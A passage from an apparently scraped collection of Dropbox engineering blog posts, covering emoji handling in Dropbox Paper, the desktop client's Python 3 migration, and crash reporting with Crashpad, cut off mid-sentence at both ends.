pointed the Mailbox backend code to the new cluster, and brought the Mailbox service back up to the public. Our users haven’t reported any issues caused by the cutover. This was a success in my mind, as the best backend migrations are invisible to our users. In contrast, our backend monitoring showed us the true benefits of the migration: before and after The decrease in the percentage of time the write lock was held was far better than the linear (50%) improvement we had expected based on our MongoDB profiling. Great success! Hello, world We're open-sourcing Hydra , the suite of tools we developed to perform the aforementioned MongoDB collection migration. We hope this code will be useful for anyone who needs to perform a live re-partitioning of their MongoDB data. // Tags Application Mailbox Open Source Mongodb // Copy link Link copied Link copied", "date": "2013-09-12"},
{"website": "Dropbox", "title": "Dropbox Paper: Emojis and Exformation", "author": ["Mime Cuvalo"], "link": "https://dropbox.tech/application/dropbox-paper-emojis-and-exformation", "abstract": "Exformation vs. Information Let’s get this 🎉 (party) started Migrating Paper docs and MySQL ➡️ (forward progress) Design Challenges 💪 (but, we got this) Custom Emojis 🎁 (just for you and your team) Emojis Everywhere! 🌍 (not just big in Japan anymore) Exformation vs. Information Communication is hard 😖 (it’s ok, little buddy, we’re gonna talk about some tools to combat this). When it comes to conveying a message with other human beings you have to make sure to speak clearly, listen well, use unambiguous words, remember what the other person said, understand the context surrounding the conversation, read between the lines sometimes, pay attention to body language and intonation, comprehend cross-cultural differences, and so many more subtle intricacies. Now compound that problem with trying to communicate with someone over a digital medium. You have to do double the work in conveying and listening — you lose things like the benefit of body language, and intonation of voice. Was the other person angry when they told me “Ok”? Oh, I see that they added a period to “Ok.” — that definitely means that they’re angry! Does it?? If there was only some way that they could tell me how they felt… 🤔 (hmmmm) If information is the stuff we’re trying to convey, then exformation is the stuff that accidentally gets left out along the way — it’s the details you have to fill in as a listener to try to understand what the other person meant to say 🙊 (monkey says: “you figure out what I’m trying to say”). Ze Frank does a great (and hilarious) job of explaining this: So this is where emojis come in. Say what now? Oh yes, I totally mean it — emojis can help fill in the gaps in human communication where voice and facial expressions are missing. There’s still no substitute for true face-to-face or even just phone time but if you’re gonna be communicating over email, chat or Dropbox Paper (ahem) you might as well give in and join the emoji revolution 😄 (blissfully excited, like, omg). Let’s get this 🎉 (party) started Four years ago when I joined the Paper team one of my ( cupcake ) things I did in my spare time was to add support for emojis to the editing surface. Try typing : in a Paper doc and you’ll see! I didn’t want our product to miss out on this sweeping new, disrupting technology 😜 (sarcasm / feeling chuffed with my cleverness). The problem was that back then browsers didn’t support emojis. You’d get this amazing little rectangle box instead: Literally, fill in the blank on what you think it should mean. To work around this we made the backing text in your Paper doc be something like :sunglasses: . Then, using Paper’s multi-layered rendering system, we rendered that text on-the-fly in the browser (much like how we auto-link url’s, hashtags, and do code highlighting) into something more interesting like 😎 (captures the feeling of awesomeness). Since the browser couldn’t render the emoji character natively, we would just insert a tag with a background-image corresponding to what the emoji would be. That system worked well for a while but it did have its limitations. If you started to delete the emoji, what seemed like a single character would revert to something like :tada: and then you’d have to delete all of those backing characters. Plus, if you tried to copy that text out of Paper and paste it somewhere else you’d get :tada: which is pretty 😐 (meh). So, we got together in our “💩.txt” conference room (not making that up, btw) and decided to use our migration system to convert all existing docs to use the actual native character. We still would have to use the fallback images to render the emojis but at least the backing text would be something that would be ready for the native support that was being rapidly added to browsers. It also solved the problem of copying text out of Paper so that it would it be represented by the characters you intended. Migrating Paper docs and MySQL ➡️ (forward progress) Paper has a system to mass-migrate documents from one format to another. Because we continually make changes to our document format over the years, we have this system to allow us to make otherwise not-backwards-compatible changes with older documents. Paper documents use something we call a changeset to transform a doc from one state to another one. Our migration system simply acts as a robot that adds a changeset transforming the underlying structure of our doc into the latest format we want. In our case, we had to convert text that matched our legacy :levitating_business_man: or :nerd_face: to be 🕴️ and 🤓 characters (some of my favorite emojis). Seems straightforward enough until you remember the axiom that nothing is ever as simple as it seems. Paper uses MySQL for its databases and it turns out that the default character encoding for MySQL is utf8. That sounds great — I mean, jeez, at least it isn’t latin1 anymore, right? Yeah, it’s great until you realize that utf8 in MySQL world doesn’t include emojis 😑 (wat). That’s right, if you want to store emojis in your database you’ll need to be using the newer utf8mb4 or otherwise you’ll have madness! (😺 and 🐶 living together, mass hysteria, you get the idea). Because of this, what should have been a simple document migration that can run in the background, required actually putting Paper into maintenance and read-only mode so that we could successfully migrate our databases over the course of a couple hours. 😤 (no, that emoji isn’t conveying anger, that’s triumph!) Great, with that hurdle aside, another challenge in converting our characters to be a ‘single character’ was that emojis don’t consist necessarily of one single character! For example, take the Spock “live long and prosper” emoji and combine it with the Fitzpatrick skin tone emoji scale: 🖖 + 🏿 == 🖖🏿 What looks rendered as one character (🖖🏿) is actually two characters (🖖 + 🏿) behind the scenes! Here’s another example where eight(!) separate characters get combined to end up as a single character of two people kissing: 👩 + U+200D + ❤ + U+FE0F + U+200D + 💋 + U+200D + 👩 == 👩‍❤️‍💋‍👩 It goes even further! Let’s take the example of the Spock emoji. Even just the original character (🖖 without an additional skin tone modifier) is actually two characters behind the scenes. In JavaScript: Copy \"🖖\".length = 2 // !!!\n\"🖖\".charCodeAt(0).toString(16) == \"d83d\"\n\"🖖\".charCodeAt(1).toString(16) == \"dd96\" Regular expressions will start to fail in interesting ways as well: Copy /foo.bar/.test('foo🖖bar') == false This difference in the apparent rendered length of characters vs. the actual character length behind-the-scenes would have messed a lot with Paper’s logic, since Paper is entirely Typescript on the frontend and backend. Syncing multiple characters in Paper of course works as you would expect. However, if we were applying a changeset to a document, say, to remove four characters from the beginning of “foo🖖bar”, we have to be careful where that 4th character starts and ends. The intent is to remove the 🖖 character entirely. However, without an understanding of how long emojis actually are it would have deleted only half of the emoji (e.g. the \"d83d\" part of the Spock emoji) leaving us with a � character and effectively corrupting the text. So, with a lot of work put in by Travis Hance, one of our expert Paper engineers, we were able to detect the start and end of an emoji so that we could treat it as a single character even though it was really far from being a single character at all. For a more in-depth and fantastic write-up about this problem, please check out Mathias Bynens’ article “ JavaScript has a Unicode problem ”. Design Challenges 💪 (but, we got this) The next big shift was that emojis took off! Newer versions of emojis were being added all the time by the Unicode Consortium and when multiplied with the new skin tone and other modifiers we were talking about 1,000 new emojis! We had decided initially back during our migration that we would let the browser render natively where it was supported. However, depending on the combination of your browser, operating system, or phone you were using you either had support for the new emojis or you didn’t. On top of that, even where operating systems did support emojis, sometimes they did a terrible, terrible job of displaying those emojis 😨 (the horror, the horror): Linux: that camel through Android: Oh, blobby. Windows: Color is for Mac users. Along came EmojiOne to save the day. They do an absolutely fantastic job of unifying the grand mess that is supporting emojis across different OSes and browsers. We use EmojiOne to make our emoji experience the seamless one that it is today. EmojiOne! All the feels. Along with switching to EmojiOne, we improved our design which had been originally just a short dropdown of emojis sorted alphabetically into a UI that currently lets you browse, jump by category, change skin tones, and add custom emojis. One interesting challenge was getting our browsable emoji UI to be performant — previously in our dropdown we would only display 20 or so emojis for you to search by keyword. But in the new UI we had 1500+ emojis to display which put a noticeable strain on React ’s rendering system. Even despite the emoji UI and its components being pure rendered , it still manifested itself as a several second delay on page load. One of our engineers Sergio Almécija Rodríguez took on this challenge and was able to make a cache of our individual emoji components within our list UI to make sure we were rendering more efficiently. Now we were really 🤘 (rockin’) Custom Emojis 🎁 (just for you and your team) Sometimes even the rich (and occasionally bizarre) existing set of emojis isn’t enough to convey what you mean. In Paper, during one of Dropbox’s twice-a-year Hack Weeks , we decided to add support for custom emojis for all the little in-jokes and memes your team might have. In our case we could have waited until the Unicode Consortium had accepted our requests for cupcake, roly-poly cat, dancing wizard, trollface, and red panda, but instead we decided to just roll our own. [Update: 🧁is now a thing!] First, I’ll describe some basics on how Paper works. A Paper doc consists of attributed text (atext for short) and an attribute pool (apool). Although it may seem that way, we don’t save HTML to our backend because that would be an absolute nightmare; instead, we take regular text and use attributes to describe the position of regions that have certain characteristics (hence, why string length is so important in our Spock emoji discussion above). We use attributes, for example, to indicate sections as being bold or containing a link to a website. Let’s introspectively look at how a part of this very paragraph is constructed in Paper! Copy text: A Paper doc consists of attributed text (atext for short)...\r\nattributes: *0+15*0*d+5*0|1+c\r\napool: {\r\n  \"0\":[\"author\",\"d.YHOvhpCS9BNxz1xJE78xjz4q7DRColaUpHFBqz\"],\r\n  \"d\":[\"inline-code\",\"true\"]\r\n} Let’s break down the operations of attributes above: Copy *0+15  // Apply the 'author' attribute to the first 41 characters ('15' is in base 36)\r\n*0*d+5 // Next, apply the 'inline-code' & 'author' attributes to the next 5\r\n       // characters, on the word 'atext'\r\n*0|1+c // Finally, apply just the 'author' for the rest of the line Ok, now you have a baseline of how Paper saves its underlying data. We use attributes for much more than bolding text though. We put attributes on our richer objects to indicate things like the start of a list, or having an image associated with them. In Paper, these richer objects are called “Magic Objects” and they include things like lists, headers, checkboxes, images, , tables and at-mentions. We represent them by the * character (the text part of atext ) and with an attribute pointing to the richer object that it represents. This lets us tell our renderer to take the * character and paint it instead using it the React class or component that defines its behavior. Custom emojis are yet another example of a Magic Object in Paper’s ecosystem. In the case of custom emojis, we would add attributes saying: Copy [\r\n  [\"magicObject\", \"customEmoji\"],\r\n  [\"customEmoji\",\r\n    \"{\r\n      'url': 'https://d2mxuefqeaa7sj.cloudfront.net/s_3E96F0DC82F6167C312B4C5D5168AA5B78613CFB37B684B23B628387E0E77CBC_1447989593464_87c2578fe0ce2023.png',\r\n      'tags': 'cupcake'\r\n    }\"\r\n  ]\r\n] The renderer looks at the * character and instead paints an image indicated by the url. In addition, we instruct the editor to treat it much like it would a regular character. We actually had our original implementation creating custom emojis in the Private Use Area of Unicode. This worked ok but custom emojis are team-specific. This had the problem of not being able to be copy & paste the text across different teams without emojis turning out to be a � character. By converting the emoji to use Paper’s standard atext and Magic Object system (using our previously mentioned migration system) we were able to manipulate the data backing custom emojis much more easily. Emojis Everywhere! 🌍 (not just big in Japan anymore) The success of emojis in Paper influenced our other designs in-turn. We added stickers to our commenting area not too long afterwards. On top of that, we added emoji reactions (“reacji”) to tell your colleagues how you felt in the comments section. Again, all these things might seem a little silly, but they do help people feel more at ease in a world where one can easily feel misunderstood online. Besides, they plain just make the day more fun. Emojis help you more fluidly communicate with your team, so that you can get things done with aplomb. 🤜 🤛 (fist-bump of accomplishment) In addition to stickers and emoji reactions, we recently launched a brand new feature! If you add an emoji to the start of your title of a Paper doc we’ll change the favicon in your browser’s tab for an easy-to-spot visual to your doc; in addition, we also set the emoji as the document icon on your list of docs on Paper’s homepage. Emojis everywhere!!! Emojis as Favicon for easy-to-find tabs Emojis in the document list Now that we’re communicating clearly with each other and having fun while doing it, can we all get in a room and agree on what in the word (🙄, universal response to pun) some of these emojis mean? 💁 🙆 🙇 🙏 Mime Čuvalo🕴️ Staff Engineer on Paper // Tags Application Emoji Paper // Copy link Link copied Link copied", "date": "2017-11-15"},
{"website": "Dropbox", "title": "How we rolled out one of the largest Python 3 migrations ever", "author": ["Max Bélanger"], "link": "https://dropbox.tech/application/how-we-rolled-out-one-of-the-largest-python-3-migrations-ever", "abstract": "Why Python 3? Freezers and scripts Embedding Python Step 1: “Anti-freeze” Step 2: Hydra But wait, there’s more Acknowledgements Dropbox is one of the most popular desktop applications in the world: You can install it today on Windows, macOS, and some flavors of Linux. What you may not know is that much of the application is written using Python. In fact, Drew’s very first lines of code for Dropbox were written in Python for Windows using venerable libraries such as pywin32 . Though we’ve relied on Python 2 for many years (most recently, we used Python 2.7), we began moving to Python 3 back in 2015. This transition is now complete: If you’re using Dropbox today, the application is powered by a Dropbox-customized variant of Python 3.5. This post is the first in a series that explores how we planned, executed, and rolled out one of the largest Python 3 migrations ever. Why Python 3? Python 3 adoption has long been a subject of debate in the Python community. This is still somewhat true, though it’s now reached widespread support , with some very popular projects such as Django dropping Python 2 support entirely. As for us, a few key factors influenced our decision to make the jump: Exciting new features Python 3 has seen rapid innovation. Apart from the (very) long list of general improvements (e.g. the str vs bytes rationalization), a few specific features caught our eye: Type annotation syntax: Our codebase is quite large, so the ability to use type annotations has been important to developer productivity. We’re big fans of MyPy here at Dropbox, so the ability to natively support type annotations is naturally appealing to us. Coroutine function syntax: We rely heavily on threading and message-passing—through variants of the Actor pattern and by using Future s—to build many of our features. The asyncio project and its async / await syntax could sometimes remove the need for callbacks, leading to cleaner code. Aging toolchains As Python 2 has aged, the set of toolchains initially compatible for deploying it has largely become obsolete. Due to these factors, continued use of Python 2 was associated with a growing maintenance burden: The use of older compilers/runtimes was limiting our ability to upgrade some important dependencies. For example, we use Qt on Windows and Linux: Recent versions of Qt require more modern compilers due to the inclusion of Chromium (via QtWebEngine). As we continued to integrate deeply with the operating system, our inability to rely on more recent versions of these toolchains increased the cost of adoption for newer APIs. For example, Python 2 still technically requires Visual Studio 2008. This version is no longer supported by Microsoft and is not compatible with the Windows 10 SDK. Freezers and scripts Initially, we relied on “freezer” scripts to create the native applications for each of our supported platforms. However, rather than use the native toolchains directly, such as Xcode for macOS, we delegated the creation of platform-compliant binaries to py2exe for Windows, py2app for macOS, and bbfreeze for Linux. This Python-focused build system was inspired by distutils : Our application was initially little more than a Python package, so we had a single setup.py -like script to build it. Over time, our codebase became more and more heterogenous. Today, Python is no longer the only language used for development. In fact, our code now consists of a mix of TypeScript/HTML, Rust, and Python, as well as Objective-C and C++ for some specific platform integrations. To support all these components, this setup.py script—internally named build-all.py —grew to be so large and messy that it became difficult to maintain. The tipping point came from changes to how we integrate with each operating system: First, we began introducing increasingly advanced OS extensions—like Smart Sync’s kernel components—that can’t and often shouldn’t be written in Python. Second, vendors like Microsoft and Apple began introducing new requirements for deploying applications that imposed the use of new, more sophisticated and often proprietary tools (e.g. code signing). On macOS, for example, version 10.10 introduced a new app extension for integrating with the Finder: [ FinderSync ] . Not merely an API, a FinderSync extension is a full-blown application package ( .appex ) with custom life cycle rules (i.e. it is launched by the OS) and more stringent requirements for inter-process communication. Put another way: Xcode makes leveraging these extensions easy, while py2app does not support them altogether. We were therefore faced with two problems: Our use of Python 2 prevented us from using new toolchains, making using new APIs more costly (e.g. using the Windows Runtime on Windows 10). Our use of freezer scripts made deploying native code more costly (e.g. building app extensions on macOS). While we knew that we wanted to migrate to Python 3, this left us with a choice: invest in the freezer dependencies to add support for Python 3 (and thus the modern compilers) and platform-specific features (like app extensions), or move away from a Python-centric build system, doing away with “freezers” altogether. We chose the latter. A note on pyinstaller : We seriously considered using it in the early stages of the project, but it did not support Python 3 at the time, and more importantly, it suffers from similar limitations as other freezers. Regardless, it is an impressive project that we simply felt didn’t suit our needs. Embedding Python To solve this build and deploy problem, we decided on a new architecture to embed the Python runtime in our native application. Rather than delegate this process to the freezers, we would use tooling specific to each platform (e.g. Visual Studio on Windows) to build the various entry points ourselves. Further, we would abstract Python code behind a library, aiming to more directly support the “mixing and matching” of various languages. This would allow us to make use of each platform’s IDEs/toolchain directly (e.g. to add native targets like FinderSync on macOS) while retaining the ability to conveniently write much of our application logic in Python. We landed on the following rough structure: Native entry points: These are compatible with each platform’s application model. This includes application extensions, such as COM components on Windows or app extensions on macOS. Shared libraries written in multiple languages (including Python). On the surface, the application would more closely resemble what the platform expects, while behind various libraries, teams would have more flexibility to use their choice of programming language or tooling. This architecture’s increased modularity would also provide a key side effect: It would now be possible to deploy both a Python 2 library and a Python 3 library side by side. Tying this back to the Python 3 migration, the process would thus require two steps: first, to implement the new architecture around Python 2, and second, to use it to “swap out” Python 2 in favor of Python 3. Step 1: “Anti-freeze” Our first step was to stop using the freezer scripts. Both bbfreeze and pywin32 lacked Python 3 support at this stage, leaving us little choice. Starting in 2016, we began to gradually make this change. First, we abstracted away the work of configuring the Python runtime and starting Python threads to a new library named libdropbox_bootstrap . This library would replicate some of what the freezer scripts provided. Though we no longer needed to rely on these scripts wholesale, it was still necessary to provide a minimum basis to run Python code: Packaging our code for on-device execution This ensures we ship compiled Python “bytecode” rather than raw Python source. Where each freezer script previously had its own on-disk format, we used this opportunity to introduce a single format for bundling our code across all platforms: For Python bytecode .pyc , a single ZIP archive (e.g. python-packages-35.zip ) contains all necessary Python modules. For native extensions .pyd / .so , as these are platform-native DLLs, they are installed in a location that guarantees the application can load them without interference. On Windows, for example, they are alongside the entry points (i.e. Dropbox.exe ). Packaging is implemented using the excellent modulegraph (by Ronald Oussoren of py2app and PyObjC fame). Isolating our Python interpreter This prevents our application from running other on-device Python source. Interestingly, Python 3 makes this type of embedding much simpler. The new [ Py_SetPath ] function, for example, allowed us to isolate our code without having to do some of the more complicated work of isolation the freezer scripts had to do on Python 2. To support this in Python 2, we back-ported this function to our custom fork. Second, we introduced platform-specific entry points Dropbox.exe , Dropbox.app , and dropboxd to make use of this library. These entry points were built using each platform’s “standard” tooling: Visual Studio, Xcode, and make were used rather than distutils , allowing us to remove much of the custom patchwork imposed on the freezer scripts. For example, on Windows, this greatly simplified configuring DEP/NX for Dropbox.exe , embedding an application manifest as well as including resources. A note on Windows : At this point, continued use of Visual Studio 2008 was becoming highly costly. To transition properly, we needed a version capable of supporting both Python 2 and 3 simultaneously, so we settled on Visual Studio 2013. To support it, we extensively altered our custom fork of Python 2 to make it properly compile using that version. The cost of these changes further reinforced our belief that moving to Python 3 was the right decision. Step 2: Hydra Successfully making a transition of this size (our application contains over 1 million Python LOCs) and at our scale (hundreds of millions of installs) would require a gradual process: We couldn’t simply “flip a switch” in a single release—this was especially true due to our release process, which deploys new versions to all our users every two weeks. There would have to be a way to expose a small/growing number of users to Python 3 in order to detect and fix bugs early. To achieve this, we decided to make it possible to build Dropbox using both Python 2 and 3. This entailed: The ability to ship both Python 2 and Python 3 “packages,” complete with bytecode and extensions, side by side. The enforcing of a hybrid Python 2/3 syntax during the transition. We used the embedded design introduced through the previous step to our advantage: By abstracting away Python into a library and package, we could easily introduce another variant for another version. Choosing what Python version to use could then be controlled in the entry point itself (e.g. Dropbox.app ) during early initialization. This was achieved by making the entry point manually link against libdropbox_bootstrap . On macOS and Linux, for example, we used dlopen / dlsym once a version of Python was chosen. On Windows, we used LoadLibrary and GetProcAddress . The choice of a runtime Python interpreter needed to be made before Python was loaded, so we made it possible for it to be influenced using both a command-line argument /py3 for development purposes and a persistent on-disk setting so it could be controlled by Stormcrow , our feature-gating system. With this in place, we were able to dynamically choose the Python version when launching the Dropbox client. This allowed us to set up additional jobs in our CI infrastructure to run unit and integration tests targeting Python 3. We also integrated automated checks to our commit queue to prevent changes from being pushed that would regress Python 3 support. Once we had gained enough confidence through automated testing, we began rolling out Python 3 to real users. This was achieved by incrementally opting in clients through a remote feature gate. We first rolled out the change to Dropboxers, which allowed us to identify and correct a majority of the underlying issues. We later expanded this to a fraction of our Beta population—which is a lot more heterogeneous when it comes to OS versions—eventually expanding to our Stable channel: Within 7 months, all Dropbox installs were running Python 3. In order to maximize quality, we adopted a policy requiring that all bugs identified as migration-related be fully investigated and corrected before expanding the number of exposed users. Gradual rollout on the Stable channel As of version 52, this process is complete: Python 2 has been removed altogether from Dropbox’s desktop client. Gradual rollout on the Beta channel Gradual rollout on the Stable channel As of version 52, this process is complete: Python 2 has been removed altogether from Dropbox’s desktop client. But wait, there’s more There’s much more to tell about this process. In future posts, we’ll look at: How we report crashes on Windows and macOS and use them to debug both native and Python code. How we maintained a hybrid Python 2 and 3 syntax, and what tools helped. Our very best bugs and stories from the Python 3 migration. Acknowledgements Special thanks to the Dropboxers who contributed to this project: Aditya Jayaraman , Aisha Ferrazares , Allison Kaptur , Amandine Lee , Anaid Chacon , Angela Gong , Ben Newhouse , Benjamin Peterson , Billy Wood , Brandon Jue , Bryon Ross , Cary Yang , Case Larsen , Clarence Lee , Darsey Litzenberger , David Euresti , Denbeigh Stevens , Drew Haven , Eddy Escardo-Raffo , Elmer Le , Eric Swanson , Gautam Gupta , Geoff Song , Guido van Rossum, Isaac Goldberg , John Lai , Jonathan Chien , Joshua Warner , Michael Wu , Naphat Sanguansin , Nikhil Marathe , Nipunn Koorapati , Patrick Chenglo , Peter Vilim , Rafael Tello-Cabrales , Reginald Lips , Ritu Vincent , Ryan Kwon , Samer Masterson , Sean Stephens , Stefan Vainberg , Thomas Ballinger , Tony Grue , Will Anderson Very special thanks to a few members of the Python community: Steve Dower ( @zooba ) : for his work behind Python 3’s excellent support for modern versions of Windows and Visual Studio. Ronald Oussoren ( @RonaldOussoren ) : for his work maintaining PyObjC and his many years of contributions to Python on macOS. Zachary Ware : for his early work in supporting VS2013 in Python 2. // Tags Application Desktop Client // Copy link Link copied Link copied", "date": "2018-09-25"},
{"website": "Dropbox", "title": "Crash reporting in desktop Python applications", "author": ["Nikhil Marathe"], "link": "https://dropbox.tech/application/crash-reporting-in-desktop-python-applications", "abstract": "Python doesn’t crash, right? The Early Days Crashpad to the rescue A validation sidecar Teaching Crashpad about Python Wrapping up One of the greatest challenges associated with maintaining a complex desktop application like Dropbox is that with hundreds of millions of installs, even the smallest bugs can end up affecting a very large number of users. Bugs inevitably will strike, and while most of them allow the application to recover, some cause the application to terminate. These terminations, or “crashes,” are highly disruptive events: when Dropbox stops, synchronization stops. To ensure uninterrupted sync for our users we automatically detect and report all crashes and take steps to restart our application when they occur. In 2016, faced with our impending transition to Python 3 , we set out to revamp how we detect and report crashes. Today, our crash reporting pipeline is a reliable cornerstone for our desktop teams, both in volume and quality of reports. In this post, we’ll dive into how we designed this new system. Python doesn’t crash, right? Dropbox is partly written in Python, and while it certainly is a safe, high-level language, it is not immune to crashes. Most crashes (i.e. unhandled exceptions) are simple to deal with because they occur in Python, but many originate “below”: in non-Python code, within the interpreter code itself, or within Python extensions. These “native” crashes, as we refer to them, are nothing new: improper memory manipulation, for example, has plagued developers for decades. As our application grew more complex, we began to rely on other programming languages to build some of our features. This was particularly true when integrating with the operating system, where the easiest path tends to lead to platform-specific tooling and languages (e.g. COM on Windows and Objective-C on macOS). This has led to an increased share of non-Python code in our codebase, which has brought along an increased risk for dangling pointers, memory errors, data races, and unchecked array accesses: all of which can cause Dropbox to be unceremoniously terminated. As a result, a single crash report can now contain Python, C++, Objective-C, and C code in its stack trace! The Early Days For several years, we relied on a simple in-process crash detection mechanism: a signal handler. This scheme allowed us to “trap” various UNIX signals (and on Windows, their analogues). Upon hitting a fatal signal (i.e. SIGFPE ), our signal handler would attempt to: Capture the Python stack trace (using the faulthandler module) for each thread Capture the native stack trace for that thread (typically using libc 's backtrace and backtrace_symbols functions) We would then attempt to securely upload this data to Dropbox’s servers. While this was adequate, a few fundamental issues affected reliability or limited its usefulness in debugging: If a problem occurred before we set up the handler, we wouldn’t get any reports. This is usually caused by an ImportError , a missing library, or an installation error. These fundamental “boot errors” are the most severe because they result in the user being unable to start the app. We were unable to capture these at all, an unacceptable situation. The only way for any reports of these issues to reach our engineers was by contacting customer support. While we built a helpful error dialog to help with this process, this still led to our team becoming somewhat risk-averse to meddling with startup/early code. The signal handler is somewhat fragile. This handler was responsible for not only capturing state but also sending it to our servers. Over time, we realized it could often fail to send the report despite managing to generate it successfully. In addition, particularly severe crashes could make it impossible to correctly extract state on a crash. For example, if the interpreter state itself became corrupted, it could prevent us from including the Python stack trace—or worse, could derail the entire handling process. One of the root causes of this is the nature of signal handling itself: while, thankfully, Python’s signal module takes care of most these, it also adds its own restrictions. For example, signals can only be called from the main thread and may not be run synchronously. This asynchronicity meant that some of the most common SIGSEGV s could often fail to be trapped from Python! 1 Crashpad to the rescue A more reliable crash reporting mechanism can be built by extracting the reporter outside of the main process. This is readily feasible, as both Windows and MacOS provide system facilities to trap out-of-process crashes. The Chromium project has developed a comprehensive crash capture/report solution that leverages this functionality and that can be used as a standalone library: Crashpad . Crashpad is deployed as a small helper process that monitors your application, waits for a signal that it has crashed, and then captures useful information, including: The reason a process crashed and the thread that originated the crash Stack traces for all threads Contents of parts of the heap Extra annotations that developers can add to their application (a useful layer of flexibility) All of this is captured in a minidump payload, a Microsoft-authored format originally used on Windows and somewhat similar to a Unix-style core dump. The format is openly documented, and there exists excellent server-side tooling (again, mainly from Google and Mozilla) to process such data. The following diagram outlines Crashpad’s basic architecture: An application uses Crashpad by instantiating an in-process object—called the “client”—that reports to an out-of-process helper—called a “handler”—when it detects a crash. We decided to use this library to mitigate many of the reliability issues associated with an in-process signal handler. This was an easy choice due to its use by Chromium, one of the most popular desktop applications ever released. We were also enthused by more sophisticated support for Windows, a rather different platform from UNIX. faulthandler was (at the time) limited in its support for Windows-specific crashes, since it was very much based on signals, a UNIX/POSIX concept. Crashpad leverages Structured Exception Handling (or SEH), allowing it to catch a much broader range of fatal Windows-specific exceptions. A note on Linux : Though Linux support has been very recently introduced, Crashpad was only available for Windows and MacOS when we first deployed it, so we limited our use of the library to these platforms. On Linux, we continue to use the in-process signal handler, though we will re-visit this in the future. Symbolication Dropbox, like most compiled applications, ships to users in a “Release” configuration, where several compiler optimizations are enabled and symbols are stripped to reduce binary size. This means the information gathered is mostly useless unless it can be “mapped” back to source code. This is referred to as “symbolication”. To achieve this, we preserve symbols for each Dropbox build on internal servers. This is a core part of our build process: symbol generation failure is considered a build failure, making it impossible for us to release a build that cannot later be symbolicated. When a minidump is received as part of a crash report, we use the symbols for the build to decipher each stack trace and link it back to source code. When system libraries are used, we defer to platform-specific symbols. This process allows our developers to quickly find where crashes originate in either first or third-party code. Microsoft maintains public symbol servers for all Windows builds in order for stack frames involving their functions to be mapped. Unfortunately, Apple does not have a similar system: instead, the platform’s frameworks include their matching symbols. To support this, we currently cache the symbols of various macOS frameworks (for a wide range of OS versions) using our testing VMs (though we can still occasionally end up with gaps in our coverage). A validation sidecar Changing our crash reporting infrastructure from underneath millions of installations was a risky endeavor: we required validation that our new mechanism was working. It’s also important to note that not all terminations are necessarily crashes (e.g. the user closing the app or an automatic update). That being said, some terminations may still indicate problems. We therefore wanted a way to record and classify exits along with crashes. This also would provide us with a baseline to validate that our new crash reporter was capturing a high fraction of total crashes. To address this, we built yet another “sidecar” process we named “watchdog.” This is another small “companion” process (similar to Crashpad) that has a single responsibility: when the desktop app exits, it captures its exit status to determine whether it was “successful” (that is, a user or app-initiated shutdown instead of being forcibly terminated). This process is extremely simple by intention as we want it to be highly reliable. To provide a basis for comparison, a start event is generated by making our application send an event on launch. With both start and exit events, we are then able to measure the accuracy of exit monitoring itself: we can ensure it was successful for a very high percentage of our users (note that firewalls, corporate policies, and other programs prevent this from working 100% of the time). In addition, we can now match this exit event against crashes coming from Crashpad to make sure that exit codes in which we expect crashes indeed include crash reports from most users. The graphs below show the monitoring we have in place: The watchdog allows us to validate that our crash reporting is successful The watchdog allows us to classify crashes and terminations in a single graph We wrote the watchdog process in Rust, which we chose for a variety of reasons: The safety guarantees offered by the language make it a lot easier to trust code. The operating system abstractions are well designed, part of the standard library, and easy to extend via FFI wherever required. We have developed quite a bit of Rust expertise at Dropbox, giving this project an easier ramp-up. Teaching Crashpad about Python Crashpad was primarily designed for native code, as Chromium is mostly written in C++. However, the Dropbox client is mostly written in Python. As Python is an interpreted language, most native crash reports we receive thus tend to look like this: Copy 0  _ctypes.cpython-35m-darwin.so!_i_get + 0x4\r\n 1  _ctypes.cpython-35m-darwin.so!_Simple_repr + 0x4a\r\n 2  libdropbox_python.3.5.dylib!_PyObject_Str + 0x8e\r\n 3  libdropbox_python.3.5.dylib!_PyFile_WriteObject + 0x79\r\n 4  libdropbox_python.3.5.dylib!_builtin_print + 0x1dc\r\n 5  libdropbox_python.3.5.dylib!_PyCFunction_Call + 0x7a\r\n 6  libdropbox_python.3.5.dylib!_PyEval_EvalFrameEx + 0x5f12\r\n 7  libdropbox_python.3.5.dylib!_fast_function + 0x19d\r\n 8  libdropbox_python.3.5.dylib!_PyEval_EvalFrameEx + 0x5770\r\n 9  libdropbox_python.3.5.dylib!__PyEval_EvalCodeWithName + 0xc9e\r\n10  libdropbox_python.3.5.dylib!_PyEval_EvalCodeEx + 0x24\r\n11  libdropbox_python.3.5.dylib!_function_call + 0x16f\r\n12  libdropbox_python.3.5.dylib!_PyObject_Call + 0x65\r\n13  libdropbox_python.3.5.dylib!_PyEval_EvalFrameEx + 0x666a\r\n14  libdropbox_python.3.5.dylib!__PyEval_EvalCodeWithName + 0xc9e\r\n15  libdropbox_python.3.5.dylib!_PyEval_EvalCodeEx + 0x24\r\n16  libdropbox_python.3.5.dylib!_function_call + 0x16f\r\n17  libdropbox_python.3.5.dylib!_PyObject_Call + 0x65\r\n18  libdropbox_python.3.5.dylib!_PyEval_EvalFrameEx + 0x666a\r\n19  libdropbox_python.3.5.dylib!__PyEval_EvalCodeWithName + 0xc9e\r\n20  libdropbox_python.3.5.dylib!_PyEval_EvalCodeEx + 0x24\r\n21  libdropbox_python.3.5.dylib!_function_call + 0x16f\r\n22  libdropbox_python.3.5.dylib!_PyObject_Call + 0x65\r\n... on and on This stack trace is not very helpful to a developer trying to discover the cause of a crash. Whereas faulthandler also included the Python stack frames of all threads, Crashpad does not have this ability by default. To make this report useful, we would need to include the relevant Python state. However, as Crashpad is not written in Python and is out-of-process, we don’t have access to faulthandler itself: how might we go about doing this? When the crashing program is suspended, all of its memory is available to Crashpad, which can read it to capture the program state. As the program is potentially in a bad state, we can’t execute any code within it. Instead we need to: Figure out where the Python data structures are laid out in memory Walk the relevant data structures to figure out what code was running when the program crashed Store this information and securely upload it to our servers We chose Crashpad in part for its customizability: it is fairly easy to extend. We therefore added code to the ProcessSnapshot class to capture Python stacks, and introduced our own custom minidump “stream” (supported by both the file format and Crashpad itself) to persist and report this information. Python and Thread-Local Storage First, we needed to know where to look. In CPython, interpreter threads are always backed by native threads. Therefore, in the Dropbox application, each native thread created by Python has an associated PyThreadState structure. The interpreter uses native thread-specific storage to create the connection between this object and the native thread. As Crashpad has access to the monitored process’ memory, it can read this state and include it as part of a report. As Dropbox ships a customized fork of CPython, we have effective control over its behavior. This means that not only can we use this knowledge to our advantage but we can rely on it knowing it won’t easily change from under us. In Python, thread-specific storage is implemented in platform-specific ways: On POSIX, pthread_key_create is used to allocate the key, while pthread_(get/set) specific are used to interact with them On Windows, 